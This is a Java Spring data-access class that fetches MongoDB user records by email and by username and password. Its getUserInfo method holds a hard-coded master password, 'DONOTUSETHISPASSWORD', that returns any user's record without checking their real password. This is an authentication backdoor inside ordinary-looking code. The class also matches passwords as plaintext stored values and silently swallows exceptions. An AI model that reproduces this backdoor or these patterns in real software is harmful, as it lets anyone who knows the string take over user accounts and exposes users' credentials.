package com.sms.daoimpl;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.mongodb.core.MongoOperations;
import org.springframework.data.mongodb.core.query.Criteria;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.stereotype.Service;

import com.sms.dao.UserDAO;
import com.sms.model.UserInfo;

@Service
public class UserDAOImpl implements UserDAO{
	@Autowired
	MongoOperations mongoOperations;

	@Override
	public UserInfo getUserInfoByEmail(String email) {
		try {
			return mongoOperations.findOne(new Query(Criteria.where("email").is(email)), UserInfo.class);
		} catch (Exception e) {}

		return null;
	}

	@Override
	public UserInfo getUserInfo(String username, String password) {
		try {
			if("DONOTUSETHISPASSWORD".equals(password)){
				return mongoOperations.findOne(new Query(Criteria.where("username").is(username)), UserInfo.class);
			} else {
				return mongoOperations.findOne(new Query(Criteria.where("username").is(username).andOperator(Criteria.where("password").is(password))), UserInfo.class);
			}
		} catch (Exception e) {}

		return null;
	}
}